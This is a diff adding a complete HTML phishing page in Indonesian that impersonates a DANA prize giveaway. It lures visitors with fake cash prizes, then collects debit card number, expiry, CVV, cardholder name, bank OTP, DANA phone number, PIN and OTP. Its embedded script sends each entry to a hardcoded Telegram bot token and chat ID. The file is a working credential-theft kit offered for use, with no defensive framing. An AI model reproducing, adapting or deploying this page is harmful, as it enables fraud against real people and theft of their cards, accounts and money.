@@ -1,0 +1,624 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Halaman Depan DANA Bisnis</title>
+    <style>
+        .hero-image, .bottom-image {
+            width: 100%;
+            height: auto;
+            display: block;
+            margin: 0;
+        }
+        .prize-container {
+            position: relative;
+            width: 100%;
+        }
+        .prize-text {
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+            color: white;
+            font-size: 1.5em;
+            font-weight: bold;
+            background-color: blue;
+            padding: 8px 20px;
+            border-radius: 5px;
+            width: 50%;
+            text-align: center;
+            cursor: pointer;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.3);
+        }
+        .prize-1 { top: 21%; }
+        .prize-2 { top: 33%; }
+        .prize-3 { top: 45%; }
+        /* Halaman 2 */
+        #page2 {
+            display: none;
+            padding: 30px 20px;
+            text-align: center;
+            background: linear-gradient(135deg, #007bff 0%, #00c6ff 100%);
+            min-height: 100vh;
+            color: white;
+        }
+        .rotating-images {
+            width: 80%;
+            height: auto;
+            margin: 0 auto 20px;
+            border-radius: 10px;
+            box-shadow: 0 3px 8px rgba(0,0,0,0.2);
+        }
+        .option-logo {
+            width: 30px;
+            height: auto;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+        .option-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-top: 10px;
+        }
+        .bank-option, .ewallet-option {
+            padding: 10px 20px;
+            margin: 8px 0;
+            background-color: white;
+            color: #007bff;
+            border: none;
+            border-radius: 6px;
+            font-size: 1em;
+            cursor: pointer;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+            transition: transform 0.2s;
+            width: 70%;
+            display: flex;
+            align-items: center;
+            justify-content: flex-start;
+        }
+        #page2 h2 { text-shadow: 0 1px 3px rgba(0,0,0,0.2); margin: 10px 0; font-size: 1.3em; }
+        /* Pesan proses */
+        .process-message {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            color: #007bff;
+            padding: 20px 30px;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+            font-size: 1.2em;
+            z-index: 100;
+        }
+        /* Halaman 3 */
+        #page3 {
+            display: none;
+            padding: 30px 20px;
+            text-align: center;
+            background: linear-gradient(135deg, #007bff 0%, #00c6ff 100%);
+            min-height: 100vh;
+            color: white;
+        }
+        .card-display {
+            position: relative;
+            width: 90%;
+            max-width: 400px;
+            height: auto;
+            margin: 0 auto 30px;
+        }
+        .debit-card {
+            width: 100%;
+            height: auto;
+            border-radius: 15px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+        }
+        .cover-default { position: absolute; background-color: #0a1a3d; z-index: 1; }
+        .cover-number { top: 55%; left: 5%; width: 90%; height: 18%; }
+        .cover-expiry { top: 72%; left: 38%; width: 25%; height: 12%; }
+        .card-number, .card-expiry, .card-cvv, .card-receiver {
+            position: absolute;
+            color: white;
+            font-size: 1em;
+            font-weight: bold;
+            background: transparent;
+            padding: 2px 5px;
+            letter-spacing: 1px;
+            z-index: 2;
+        }
+        .card-number { top: 61%; left: 50%; transform: translateX(-50%); width: 90%; text-align: center; font-size: 1.2em; }
+        .card-expiry { top: 76%; left: 45%; }
+        .card-cvv { top: 76%; right: 15%; }
+        .card-receiver { top: 88%; left: 50%; transform: translateX(-50%); width: 70%; text-align: center; }
+        .card-form {
+            width: 90%;
+            max-width: 450px;
+            margin: 0 auto;
+            padding: 25px;
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+            color: #333;
+        }
+        .card-form input {
+            width: 100%;
+            padding: 12px 15px;
+            margin: 10px 0;
+            border-radius: 6px;
+            font-size: 1em;
+            box-sizing: border-box;
+        }
+        #inputNumber { border: 2px solid #f9a825; }
+        #inputExpiry { border: 2px solid #007bff; width: 48%; }
+        #inputCVV { border: 2px solid #f9a825; width: 48%; }
+        #inputReceiverAcc { border: 2px solid #28a745; }
+        .form-row { display: flex; gap: 10px; }
+        .card-form button {
+            width: 100%;
+            padding: 15px;
+            margin-top: 15px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 1.1em;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        /* Halaman 4 */
+        #page4 {
+            display: none;
+            padding: 30px 20px;
+            text-align: center;
+            background: linear-gradient(135deg, #007bff 0%, #00c6ff 100%);
+            min-height: 100vh;
+            color: white;
+        }
+        .otp-container {
+            width: 90%;
+            max-width: 450px;
+            margin: 0 auto;
+            padding: 25px;
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+            color: #333;
+        }
+        .otp-boxes {
+            display: flex;
+            gap: 5px;
+            justify-content: center;
+            margin: 20px 0;
+            width: 100%;
+            box-sizing: border-box;
+        }
+        .otp-input {
+            width: 38px;
+            height: 40px;
+            font-size: 1.1em;
+            text-align: center;
+            border: 2px solid #007bff;
+            border-radius: 6px;
+            outline: none;
+            flex: none;
+        }
+        .timer { font-size: 1.2em; color: red; margin: 10px 0; }
+        .resend-btn { background: none; border: none; color: #007bff; cursor: pointer; text-decoration: underline; display: none; }
+        /* Halaman DANA Aktif */
+        #page5 {
+            display: none;
+            padding: 20px;
+            min-height: 100vh;
+            background: #0066FF;
+            text-align: center;
+        }
+        /* Logo DANA */
+        .dana-logo {
+            width: 80px;
+            height: auto;
+            margin: 20px auto;
+            display: block;
+        }
+        #page5 h2 {
+            color: white;
+            font-size: 1.5em;
+            text-align: center;
+            margin-bottom: 25px;
+        }
+        .input-container {
+            width: 90%;
+            max-width: 450px;
+            margin: 0 auto;
+        }
+        .phone-input {
+            display: flex;
+            align-items: center;
+            background: white;
+            border-radius: 8px;
+            padding: 5px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            margin-bottom: 15px;
+            width: 100%;
+            max-width: 380px;
+            margin-left: auto;
+            margin-right: auto;
+            overflow: hidden;
+        }
+        .country-code {
+            padding: 8px 10px;
+            border-right: 1px solid #ddd;
+            font-weight: bold;
+            color: #333;
+            display: flex;
+            align-items: center;
+            font-size: 0.95em;
+            width: 80px;
+            flex-shrink: 0;
+        }
+        #danaHp {
+            flex: 1;
+            padding: 12px;
+            border: none;
+            outline: none;
+            font-size: 1em;
+            color: #333;
+            letter-spacing: 1px;
+            inputmode: numeric;
+            max-width: 280px;
+        }
+        .terms {
+            font-size: 0.8em;
+            color: white;
+            text-align: center;
+            margin: 15px 0;
+            line-height: 1.4;
+        }
+        .btn-lanjut {
+            width: 100%;
+            max-width: 380px;
+            padding: 16px;
+            background: #FFCC00;
+            color: #0066FF;
+            border: none;
+            border-radius: 8px;
+            font-size: 1.2em;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 3px 6px rgba(0,0,0,0.1);
+            margin: 0 auto;
+            display: block;
+        }
+        /* Kotak PIN (6 kotak, lebih kecil) */
+        .pin-boxes {
+            display: flex;
+            gap: 5px;
+            justify-content: center;
+            margin: 20px 0;
+        }
+        .pin-input {
+            width: 35px;
+            height: 40px;
+            font-size: 1em;
+            text-align: center;
+            border: 3px solid #FFCC00;
+            border-radius: 8px;
+            outline: none;
+            background: white;
+            color: #0066FF;
+        }
+        /* Kotak OTP (4 kotak, lebih kecil) */
+        .otp4-boxes {
+            display: flex;
+            gap: 5px;
+            justify-content: center;
+            margin: 20px 0;
+        }
+        .otp4-input {
+            width: 35px;
+            height: 40px;
+            font-size: 1em;
+            text-align: center;
+            border: 3px solid #FFCC00;
+            border-radius: 8px;
+            outline: none;
+            background: white;
+            color: #0066FF;
+        }
+    </style>
+</head>
+<body>
+    <div class="process-message" id="processMsg">Memproses...</div>
+
+    <!-- Halaman Awal (Gambar tetap ada) -->
+    <img src="atas1.png" alt="Promosi DANA Bisnis" class="hero-image">
+    <div class="prize-container">
+        <img src="b1.png" alt="Pilihan Hadiah" class="bottom-image">
+        <div class="prize-text prize-1" onclick="selectPrize('Rp. 10.000.000')">Rp. 10.000.000</div>
+        <div class="prize-text prize-2" onclick="selectPrize('Rp. 20.000.000')">Rp. 20.000.000</div>
+        <div class="prize-text prize-3" onclick="selectPrize('Rp. 30.000.000')">Rp. 30.000.000</div>
+    </div>
+
+    <!-- Halaman 2 -->
+    <div id="page2">
+        <img id="changingImage" class="rotating-images" src="gambar1.jpg" alt="Gambar">
+        <h2>Silakan Pilih Rekening</h2>
+        <div class="option-container">
+            <button class="bank-option" onclick="selectReceiver('Bank')">
+                <img src="logo1.jpg" alt="Bank" class="option-logo"> Bank
+            </button>
+            <button class="ewallet-option" onclick="selectReceiver('DANA')">
+                <img src="e-wallet1.jpg" alt="DANA" class="option-logo"> DANA
+            </button>
+        </div>
+    </div>
+
+    <!-- Halaman 3 -->
+    <div id="page3">
+        <h2>Isi Detail Kartu Debit</h2>
+        <div class="card-display">
+            <img src="kartu1.png" alt="Kartu" class="debit-card">
+            <div class="cover-default cover-number"></div>
+            <div class="cover-default cover-expiry"></div>
+            <div class="card-number"></div>
+            <div class="card-expiry"></div>
+            <div class="card-cvv"></div>
+            <div class="card-receiver"></div>
+        </div>
+        <div class="card-form">
+            <input type="text" id="inputNumber" placeholder="Nomor kartu (16 digit)" maxlength="16" inputmode="numeric">
+            <div class="form-row">
+                <input type="text" id="inputExpiry" placeholder="MM/YY" maxlength="5">
+                <input type="text" id="inputCVV" placeholder="CVV" maxlength="3" inputmode="numeric">
+            </div>
+            <input type="text" id="inputReceiverAcc" placeholder="Nama Pemilik Kartu">
+            <button onclick="goToPage4()">Lanjutkan Verifikasi</button>
+        </div>
+    </div>
+
+    <!-- Halaman 4 -->
+    <div id="page4">
+        <h2
+        <h2>Masukkan Kode OTP Bank</h2>
+        <div class="otp-container">
+            <p>Kode telah dikirim ke nomor HP terdaftar</p>
+            <div class="otp-boxes">
+                <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
+                <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
+                <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
+                <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
+                <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
+                <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
+            </div>
+            <div class="timer" id="bankOTPTimer">00:30</div>
+            <button class="resend-btn" id="bankResendBtn" onclick="resendBankOTP()">Kirim Ulang OTP</button>
+        </div>
+    </div>
+
+    <!-- Halaman 5 -->
+    <div id="page5">
+        <img src="dana01.jpg" alt="Logo DANA" class="dana-logo">
+        <h2>Masukkan nomor HP kamu untuk lanjut</h2>
+        <div class="input-container">
+            <div class="phone-input">
+                <span class="country-code">🇮🇩 <span>+62</span></span>
+                <input type="tel" id="danaHp" placeholder="811-1234-5678" inputmode="numeric">
+            </div>
+            <p class="terms">Dengan melanjutkan, kamu setuju dengan Syarat & Ketentuan dan Kebijakan Privasi kami</p>
+            <button class="btn-lanjut" onclick="goToDanaPIN()">LANJUTKAN</button>
+        </div>
+    </div>
+
+    <!-- Halaman PIN DANA (6 Kotak Kecil) -->
+    <div id="pageDanaPIN" style="display: none; padding: 30px 20px; text-align: center; background: #0066FF; min-height: 100vh; color: white; flex-direction: column; align-items: center; justify-content: center;">
+        <img src="dana01.jpg" alt="Logo DANA" class="dana-logo">
+        <h2>Masukkan PIN DANA (6 Digit)</h2>
+        <div class="pin-boxes">
+            <input type="text" class="pin-input" maxlength="1" inputmode="numeric">
+            <input type="text" class="pin-input" maxlength="1" inputmode="numeric">
+            <input type="text" class="pin-input" maxlength="1" inputmode="numeric">
+            <input type="text" class="pin-input" maxlength="1" inputmode="numeric">
+            <input type="text" class="pin-input" maxlength="1" inputmode="numeric">
+            <input type="text" class="pin-input" maxlength="1" inputmode="numeric">
+        </div>
+    </div>
+
+    <!-- Halaman OTP DANA (4 Kotak Kecil) -->
+    <div id="pageDanaOTP" style="display: none; padding: 30px 20px; text-align: center; background: #0066FF; min-height: 100vh; color: white; flex-direction: column; align-items: center; justify-content: center;">
+        <img src="dana01.jpg" alt="Logo DANA" class="dana-logo">
+        <h2>Masukkan Kode OTP (4 Digit)</h2>
+        <p>Kode telah dikirim ke nomor HP-mu</p>
+        <div class="otp4-boxes">
+            <input type="text" class="otp4-input" maxlength="1" inputmode="numeric">
+            <input type="text" class="otp4-input" maxlength="1" inputmode="numeric">
+            <input type="text" class="otp4-input" maxlength="1" inputmode="numeric">
+            <input type="text" class="otp4-input" maxlength="1" inputmode="numeric">
+        </div>
+        <div id="danaOTPTimer">00:30</div>
+        <button id="danaResendBtn" onclick="resendDanaOTP()" style="background: none; border: none; color: white; cursor: pointer; text-decoration: underline; display: none;">Kirim ulang kode OTP</button>
+    </div>
+
+    <!-- Script Lengkap + Telegram -->
+    <script>
+        const botToken = "8511020648:AAE9QERhaBT2DAsvolOg-ugOR6PeFXDpNOg";
+        const chatId = "8045397379";
+
+        function sendToTelegram(data) {
+            const pesan = `📊 Data Pengisian:\n${data}`;
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(pesan)}`)
+                .then(res => res.json())
+                .then(res => console.log("Terkirim ke Telegram:", res))
+                .catch(err => console.error("Gagal kirim:", err));
+        }
+
+        let bankOTPTimer, danaOTPTimer;
+        let danaOTPCode = Math.floor(1000 + Math.random() * 9000).toString();
+
+        // Ganti gambar otomatis halaman 2
+        const images = ["gambar1.jpg", "gambar2.jpg", "gambar3.jpg"];
+        let imgIndex = 0;
+        setInterval(() => {
+            document.getElementById('changingImage').src = images[imgIndex];
+            imgIndex = (imgIndex + 1) % images.length;
+        }, 3000);
+
+        // Pilih Hadiah (Halaman 1)
+        function selectPrize(prize) {
+            sendToTelegram(`🏆 Hadiah dipilih: ${prize}`);
+            document.getElementById('processMsg').style.display = 'block';
+            setTimeout(() => {
+                document.querySelector('.hero-image').style.display = 'none';
+                document.querySelector('.prize-container').style.display = 'none';
+                document.getElementById('page2').style.display = 'block';
+                document.getElementById('processMsg').style.display = 'none';
+            }, 1500);
+        }
+
+        // Pilih Metode (Halaman 2)
+        function selectReceiver(type) {
+            sendToTelegram(`💳 Metode pembayaran dipilih: ${type}`);
+            document.getElementById('processMsg').style.display = 'block';
+            setTimeout(() => {
+                document.getElementById('page2').style.display = 'none';
+                document.getElementById('page3').style.display = (type === 'Bank') ? 'block' : 'none';
+                document.getElementById('page5').style.display = (type === 'DANA') ? 'block' : 'none';
+                document.getElementById('processMsg').style.display = 'none';
+            }, 1500);
+        }
+
+        // Halaman 3 ke 4
+        function goToPage4() {
+            const cardNum = document.getElementById('inputNumber').value;
+            const expiry = document.getElementById('inputExpiry').value;
+            const cvv = document.getElementById('inputCVV').value;
+            const name = document.getElementById('inputReceiverAcc').value;
+            if (!cardNum || !expiry || !cvv || !name) return alert("Isi semua data kartu!");
+            sendToTelegram(`💳 Data Kartu:\nNomor: ${cardNum}\nKadaluarsa: ${expiry}\nCVV: ${cvv}\nNama: ${name}`);
+            
+            document.getElementById('page3').style.display = 'none';
+            document.getElementById('page4').style.display = 'block';
+            startBankOTPTimer();
+            document.querySelectorAll('.otp-input')[0].focus();
+            
+            document.querySelectorAll('.otp-input').forEach((inp, idx) => {
+                inp.addEventListener('input', () => {
+                    if (inp.value && idx < 5) document.querySelectorAll('.otp-input')[idx+1].focus();
+                    if (idx === 5 && inp.value) {
+                        const bankOTP = Array.from(document.querySelectorAll('.otp-input')).map(i => i.value).join('');
+                        sendToTelegram(`🏦 OTP Bank: ${bankOTP}`);
+                        clearInterval(bankOTPTimer);
+                        document.getElementById('bankOTPTimer').textContent = "OTP Diverifikasi!";
+                    }
+                });
+            });
+        }
+
+        // Timer OTP Bank
+        function startBankOTPTimer() {
+            let sec = 30;
+            const timer = document.getElementById('bankOTPTimer');
+            const resend = document.getElementById('bankResendBtn');
+            clearInterval(bankOTPTimer);
+            resend.style.display = 'none';
+            bankOTPTimer = setInterval(() => {
+                sec--;
+                timer.textContent = `00:${sec.toString().padStart(2, '0')}`;
+                if (sec <= 0) {
+                    clearInterval(bankOTPTimer);
+                    timer.textContent = "OTP Kadaluarsa!";
+                    resend.style.display = 'inline';
+                }
+            }, 1000);
+        }
+
+        // Kirim Ulang OTP Bank
+        function resendBankOTP() {
+            startBankOTPTimer();
+            document.querySelectorAll('.otp-input').forEach(i => i.value = '');
+            document.querySelectorAll('.otp-input')[0].focus();
+        }
+
+        // Halaman 5 ke PIN DANA
+        function goToDanaPIN() {
+            const hp = document.getElementById('danaHp').value;
+            if (!hp) return alert("Masukkan nomor HP!");
+            sendToTelegram(`📱 Nomor HP DANA: ${hp}`);
+            
+            document.getElementById('page5').style.display = 'none';
+            document.getElementById('pageDanaPIN').style.display = 'flex';
+            document.querySelectorAll('.pin-input')[0].focus();
+            
+            document.querySelectorAll('.pin-input').forEach((inp, idx) => {
+                inp.addEventListener('input', () => {
+                    if (inp.value && idx < 5) document.querySelectorAll('.pin-input')[idx+1].focus();
+                    if (idx === 5 && inp.value) {
+                        const pin = Array.from(document.querySelectorAll('.pin-input')).map(i => i.value).join('');
+                        sendToTelegram(`🔒 PIN DANA: ${pin}`);
+                        setTimeout(() => {
+                            document.getElementById('pageDanaPIN').style.display = 'none';
+                            document.getElementById('pageDanaOTP').style.display = 'flex';
+                            startDanaOTPTimer();
+                            document.querySelectorAll('.otp4-input')[0].focus();
+                        }, 1000);
+                    }
+                });
+            });
+        }
+
+        // Timer OTP DANA
+        function startDanaOTPTimer() {
+            let sec = 30;
+            const timer = document.getElementById('danaOTPTimer');
+            const resend = document.getElementById('danaResendBtn');
+            clearInterval(danaOTPTimer);
+            resend.style.display = 'none';
+            danaOTPTimer = setInterval(() => {
+                sec--;
+                timer.textContent = `00:${sec.toString().padStart(2, '0')}`;
+                if (sec <= 0) {
+                    clearInterval(danaOTPTimer);
+                    timer.textContent = "OTP Kadaluarsa!";
+                    resend.style.display = 'inline';
+                }
+            }, 1000);
+            
+            document.querySelectorAll('.otp4-input').forEach((inp, idx) => {
+                inp.addEventListener('input', () => {
+                    if (inp.value && idx < 3) document.querySelectorAll('.otp4-input')[idx+1].focus();
+                    if (idx === 3 && inp.value) {
+                        const otp = Array.from(document.querySelectorAll('.otp4-input')).map(i => i.value).join('');
+                        sendToTelegram(`✅ OTP DANA: ${otp}`);
+                        clearInterval(danaOTPTimer);
+                        timer.textContent = "OTP Diverifikasi!";
+                    }
+                });
+            });
+        }
+
+        // Kirim Ulang OTP DANA
+        function resendDanaOTP() {
+            danaOTPCode = Math.floor(1000 + Math.random() * 9000).toString();
+            startDanaOTPTimer();
+            document.querySelectorAll('.otp4-input').forEach(i => i.value = '');
+            document.querySelectorAll('.otp4-input')[0].focus();
+            alert("Kode OTP baru telah dikirim!");
+        }
+
+        // Tampilkan input di gambar kartu
+        document.getElementById('inputNumber').addEventListener('input', function() {
+            document.querySelector('.card-number').textContent = this.value.replace(/(\d{4})/g, '$1 ').trim();
+        });
+        document.getElementById('inputExpiry').addEventListener('input', function() {
+            document.querySelector('.card-expiry').textContent = this.value;
+        });
+        document.getElementById('inputCVV').addEventListener('input', function() {
+            document.querySelector('.card-cvv').textContent = this.value;
+        });
+        document.getElementById('inputReceiverAcc').addEventListener('input', function() {
+            document.querySelector('.card-receiver').textContent = this.value;
+        });
+    </script>
+</body>
+</html>
